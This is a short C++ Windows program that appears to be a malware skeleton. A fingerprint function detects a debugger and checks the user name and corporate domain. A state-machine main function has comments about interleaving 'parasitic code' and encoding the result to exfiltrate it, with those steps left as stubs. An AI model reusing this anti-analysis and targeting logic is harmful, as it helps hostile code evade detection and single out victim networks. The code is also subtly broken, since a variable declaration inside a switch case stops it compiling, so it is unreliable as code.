#include <iostream>
#include <windows.h>

int fingerprint() {
    int result = 0;
    char buffer[256];
    DWORD size = sizeof(buffer);

    // Check for debugger
    if (IsDebuggerPresent()) {
        result |= 1;
    }

    // Check username
    if (GetUserNameA(buffer, &size)) {
        if (strcmp(buffer, "user") == 0) {
            result |= 2;
        }
    }

    // Check domain name
    size = sizeof(buffer);
    if (GetComputerNameExA(ComputerNameDnsDomain, buffer, &size)) {
        if (strcmp(buffer, "corp.example.com") == 0) {
            result |= 4;
        }
    }

    return result;
}

int main() {
    int state = 0;
    while (1) {
        switch (state) {
            case 0:
                // Interleave fingerprinting with parasitic code
                state = 1;
                break;
            case 1:
                // ...
                state = 2;
                break;
            case 2:
                // Encode the result and exfiltrate
                int result = fingerprint();
                // ...
                state = -1;
                break;
            default:
                return 0;
        }
    }
    return 0;
}
